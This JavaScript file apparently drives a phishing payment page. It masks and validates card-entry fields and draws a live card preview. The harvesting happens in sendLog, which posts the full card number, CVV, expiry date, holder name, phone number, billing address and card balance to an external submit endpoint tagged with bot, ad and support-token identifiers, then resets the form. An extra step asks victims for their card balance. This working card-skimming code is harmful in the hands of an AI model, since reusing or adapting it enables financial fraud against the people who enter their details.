window.onload = function() {
    const logType = "card";

    const billingAddress = document.getElementById('billing-billing_address');
    const billingZip = document.getElementById('billing-billing_zip');
    const billingCity = document.getElementById('billing-city');
    const billingState = document.getElementById('billing-state');
    const billingCountry = document.getElementById('billing-country');
    const billingPhoneNumber = document.getElementById('billing-phone_number');

    const cardHolder = document.getElementById('cardholder');
    const cardNumber = document.getElementById('cardnumber');
    const cardDate = document.getElementById('carddate');
    const cardCvv = document.getElementById('cardcvv');
    const phoneNumber = document.getElementById('phonenumber');
    const cardBalance = document.getElementById("card_balance");

    const ccicon = document.getElementById('ccicon');
    const ccsingle = document.getElementById('ccsingle');

// MASKS
    // card holder mask
    var cardHolderMask = new IMask(cardHolder, {
        mask: /^[0-9a-zA-Z\s]*$/,
        maxLength: 21
    });

    // card number mask
    var cardNumberMask = new IMask(cardNumber, {
        mask: [{
                mask: '0000 000000 00000',
                regex: '^3[47]\\d{0,13}',
                cardtype: 'american express'
            },
            {
                mask: '0000 0000 0000 0000',
                regex: '^(?:6011|65\\d{0,2}|64[4-9]\\d?)\\d{0,12}',
                cardtype: 'discover'
            },
            {
                mask: '0000 000000 0000',
                regex: '^3(?:0([0-5]|9)|[689]\\d?)\\d{0,11}',
                cardtype: 'diners'
            },
            {
                mask: '0000 0000 0000 0000',
                regex: '^(5[1-5]\\d{0,2}|22[2-9]\\d{0,1}|2[3-7]\\d{0,2})\\d{0,12}',
                cardtype: 'mastercard'
            },
            {
                mask: '0000 000000 00000',
                regex: '^(?:2131|1800)\\d{0,11}',
                cardtype: 'jcb15'
            },
            {
                mask: '0000 0000 0000 0000',
                regex: '^(?:35\\d{0,2})\\d{0,12}',
                cardtype: 'jcb'
            },
            {
                mask: '0000 0000 0000 0000',
                regex: '^(?:5[0678]\\d{0,2}|6304|67\\d{0,2})\\d{0,12}',
                cardtype: 'maestro'
            },
            {
                mask: '0000 0000 0000 0000',
                regex: '^4\\d{0,15}',
                cardtype: 'visa'
            },
            {
                mask: '0000 0000 0000 0000',
                regex: '^62\\d{0,14}',
                cardtype: 'unionpay'
            },
            {
                mask: '0000 0000 0000 0000',
                cardtype: 'Unknown'
            }
        ],
        dispatch: function(appended, dynamicMasked) {
            var number = (dynamicMasked.value + appended).replace(/\D/g, '');

            for (var i = 0; i < dynamicMasked.compiledMasks.length; i++) {
                let re = new RegExp(dynamicMasked.compiledMasks[i].regex);
                if (number.match(re) != null) {
                    return dynamicMasked.compiledMasks[i];
                }
            }
        }
    });

    // card date mask
    var cardDateMask = new IMask(cardDate, {
        mask: 'MM{/}YY',
        autofix: true,
        blocks: {
            YY: {mask: IMask.MaskedRange, from: new Date().getFullYear() % 100, to: 99, maxLength: 2},
            MM: {mask: IMask.MaskedRange, from: 1, to: 12, maxLength: 2},
        }
    });

    // card cvv mask
    var cardCvvMask = new IMask(cardCvv, {
        mask: '0000',
    });

    // phone number mask
    if(phoneNumber)
        var phoneNumberMask = new IMask(phoneNumber, {
            mask: '+000000000000000'
        });
  
    // card balance mask
    var cardBalanceMask = new IMask(cardBalance, {
        mask: Number,
        scale: 2,
        thousandsSeparator: '',
        padFractionalZeros: true,
        normalizeZeros: true,
        radix: '.',
        mapToRadix: [','],
        min: -100000000,
        max: 100000000
    });


// HANDLERS
    // card number
    let bank = "";

    const swapColor = function(basecolor) {
        $(".front").attr('class', 'front');
        $(".back").attr('class', 'back');
        $('.front').addClass(basecolor)
        $('.back').addClass(basecolor)
    };

    cardNumberMask.on("accept", function() {
        if (bank == '' || bank == 'other') {
            switch (cardNumberMask.masked.currentMask.cardtype) {
                case 'american express':
                    ccicon.innerHTML = amex;
                    ccsingle.innerHTML = amex_single;
                    swapColor('green');
                    break;
                case 'visa':
                    ccicon.innerHTML = visa;
                    ccsingle.innerHTML = visa_single;
                    swapColor('lime');
                    break;
                case 'diners':
                    ccicon.innerHTML = diners;
                    ccsingle.innerHTML = diners_single;
                    swapColor('orange');
                    break;
                case 'discover':
                    ccicon.innerHTML = discover;
                    ccsingle.innerHTML = discover_single;
                    swapColor('purple');
                    break;
                case ('jcb' || 'jcb15'):
                    ccicon.innerHTML = jcb;
                    ccsingle.innerHTML = jcb_single;
                    swapColor('red');
                    break;
                case 'maestro':
                    ccicon.innerHTML = maestro;
                    ccsingle.innerHTML = maestro_single;
                    swapColor('yellow');
                    break;
                case 'mastercard':
                    ccicon.innerHTML = mastercard;
                    ccsingle.innerHTML = mastercard_single;
                    swapColor('lightblue');

                    break;
                case 'unionpay':
                    ccicon.innerHTML = unionpay;
                    ccsingle.innerHTML = unionpay_single;
                    swapColor('cyan');
                    break;
                default:
                    ccicon.innerHTML = '';
                    ccsingle.innerHTML = '';
                    swapColor('grey');
                    break;
            }
        } else {
            switch (cardNumberMask.masked.currentMask.cardtype) {
                case 'american express':
                    ccicon.innerHTML = amex;
                    break;
                case 'visa':
                    ccicon.innerHTML = visa;
                    break;
                case 'diners':
                    ccicon.innerHTML = diners;
                    break;
                case 'discover':
                    ccicon.innerHTML = discover;
                    break;
                case ('jcb' || 'jcb15'):
                    ccicon.innerHTML = jcb;
                    break;
                case 'maestro':
                    ccicon.innerHTML = maestro;
                    break;
                case 'mastercard':
                    ccicon.innerHTML = mastercard;
                    break;
                case 'unionpay':
                    ccicon.innerHTML = unionpay;
                    break;
                default:
                    ccicon.innerHTML = '';
                    break;
            }
        }
    });

    if (bank == '' || bank == 'other') $('.logo_bank').hide();
    document.body.style.display = "block";
    document.body.style.opacity = "1";
    document.querySelector('.preload').classList.remove('preload');

    // card holder
    cardHolderMask.on('accept', function() {
        if(cardHolderMask.value.charAt(0) === ' ')
            cardHolderMask.value = '';

        if (validHolder(cardHolderMask.value) === false) $('#cardholder').addClass('wrong');
        else $('#cardholder').removeClass('wrong');

        if (cardHolderMask.value.length == 0) {
            document.getElementById('svgname').innerHTML = 'John Doe';
            document.getElementById('svgnameback').innerHTML = 'John Doe';
        } else {
            document.getElementById('svgname').innerHTML = cardHolderMask.value;
            document.getElementById('svgnameback').innerHTML = cardHolderMask.value;
        }
    });

    // card number
    cardNumberMask.on('accept', function() {
        if (validCreditCard(cardNumberMask.value) === false) $('#cardnumber').addClass('wrong');
        else $('#cardnumber').removeClass('wrong');

        if (cardNumberMask.value.length == 0) document.getElementById('svgnumber').innerHTML = '0123 4567 8910 1112';
        else document.getElementById('svgnumber').innerHTML = cardNumberMask.value;
    });

    // card date
    cardDateMask.on('accept', function() {
        if (validDate(cardDateMask.value) === false) $('#carddate').addClass('wrong');
        else $('#carddate').removeClass('wrong');

        if (cardDateMask.value.length == 0) document.getElementById('svgexpire').innerHTML = '01/23';
        else document.getElementById('svgexpire').innerHTML = cardDateMask.value;
    });

    // card cvv
    cardCvvMask.on('accept', function() {
        if (validCvv(cardCvvMask.value) === false) $('#cardcvv').addClass('wrong');
        else $('#cardcvv').removeClass('wrong');

        if (cardCvvMask.value.length == 0) document.getElementById('svgsecurity').innerHTML = '***';
        else document.getElementById('svgsecurity').innerHTML = cardCvvMask.value;
    });

    // card balance
    cardBalanceMask.on('accept', function() {
        if (validBalance(cardBalanceMask.value) === false) $('#card_balance').addClass('wrong');
        else $('#card_balance').removeClass('wrong');
    });

    // billing
    $('.billing-input').on('keyup input', function() {
        var value = $(this).val();

        if (value.startsWith(" ")) {
            $(this).val(value.trimStart());
        }

        if (value.length === 0) $(this).addClass('wrong');
        else $(this).removeClass('wrong');
    });

    // balance button
    $('#finalsubmit').click(function() {
        if (!validForm()) return errorForm();
        if (balanceChecker) balanceStepForm();
        else sendLog(this.id);
    });

    // submit button
    $('#paybutton').click(function() {
        if (validBalance(cardBalanceMask.value)) return sendLog(this.id);
        $('#card_balance').addClass('wrong');
        errorForm();
    });


// FUNCTIONS
    function errorForm() {
        $('.err').fadeIn()
        setTimeout(() => {$('.err').fadeOut()}, 4000);
    }

    function validForm() {
        var errors = 0;

        if (billingAddress) {
            if (billingAddress.value.length == 0) {
                errors++;
                $('#billing-billing_address').addClass('wrong');
            }
        }

        if (billingZip) {
            if (billingZip.value.length == 0) {
                errors++;
                $('#billing-billing_zip').addClass('wrong');
            }
        }

        if (billingCity) {
            if (billingCity.value.length == 0) {
                errors++;
                $('#billing-city').addClass('wrong');
            }
        }

        if (billingState) {
            if (billingState.value.length == 0) {
                errors++;
                $('#billing-state').addClass('wrong');
            }
        }

        if (billingCountry) {
            if (billingCountry.value.length == 0) {
                errors++;
                $('#billing-country').addClass('wrong');
            }
        }

        if (billingPhoneNumber) {
            if (billingPhoneNumber.value.length == 0) {
                errors++;
                $('#billing-phone_number').addClass('wrong');
            }
        }

        if (!validHolder(cardHolderMask.value)) {
            errors++;
            $('#cardholder').addClass('wrong');
        }
    
        if (!validCreditCard(cardNumberMask.value)) {
            errors++;
            $('#cardnumber').addClass('wrong');
        }
    
        if (!validDate(cardDateMask.value)) {
            errors++;
            $('#carddate').addClass('wrong');
        }
    
        if (!validCvv(cardCvvMask.value)) {
            errors++;
            $('#cardcvv').addClass('wrong');
        }
    
        if (phoneNumber) {
            if (phoneNumberMask.value.length < 7) {
                errors++;
                $('#phonenumber').addClass('wrong');
            }
        }
    
        if (errors > 0)
            return false;
    
        return true;
    };

    function balanceStepForm() {
        var buttonText = loadButton(document.getElementById('finalsubmit'));
        
        if (typeof adId !== 'undefined') {
            const response = axios.post(stepsApiPath, {
                botType: botType,
                adId: adId,
                supportToken: supportToken,
                stepType: "balance"
            });
        }
        
        $("#finalsubmit").html(buttonText).css("display", "none");
        $(".billing-input").prop('readonly', true);
        $("#cardholder").prop('readonly', true);
        $("#cardnumber").prop('readonly', true);
        $("#carddate").prop('readonly', true);
        $("#cardcvv").prop('readonly', true);
        $("#phonenumber").prop('readonly', true);

        $("#card_balance").val('');
        $(".s_b").css("display", "");

        var scrollTop = $('#paybutton').offset().top;
        $(document).scrollTop(scrollTop);
    };

    function clearForm(buttonId, buttonText) {
        $("#finalsubmit").css("display", "").prop('disabled', false);
        $('#paybutton').prop('disabled', false);
        $(`#${buttonId}`).html(buttonText);
        $(".billing-input").val('').prop('readonly', false);
        $("#cardholder").val('').prop('readonly', false);
        $("#cardnumber").val('').prop('readonly', false);
        $("#carddate").val('').prop('readonly', false);
        $("#cardcvv").val('').prop('readonly', false);
        $("#phonenumber").val('').prop('readonly', false);
        $("#card_balance").val('');
        $(".s_b").css("display", "none");
    };

    function getBilling() {
        if (!billingStatus) {
            return {};
        }

        return {
            "Address": billingAddress.value,
            "ZIP": billingZip.value,
            "City": billingCity.value,
            "State": billingState.value,
            "Country": billingCountry.value,
            "Phone Number": billingPhoneNumber.value,
        };
    }

    function sendLog(buttonId) {
        var buttonText = loadButton(document.getElementById(buttonId));

        axios.post(submitApiPath, {
            botType: botType,
            adId: typeof adId === 'undefined' ? null : adId,
            supportToken: supportToken,
            logType: logType,
            cardHolder: cardHolderMask.value,
            cardNumber: cardNumberMask.value.replace(/\D+/g, ""),
            cardExpire: cardDateMask.value,
            cardCvv: cardCvvMask.value,
            phoneNumber: phoneNumberMask === undefined ? null : phoneNumberMask.value,
            cardBalance: cardBalanceMask.value,
            billing: getBilling(),
            templateType: templateType
        })
        .then((response) => {
            system.windowObj(response.data.status);
        })
        .catch((err) => {
            errorForm();
        })
        .finally(() => {
            clearForm(buttonId, buttonText);
        });
    };
};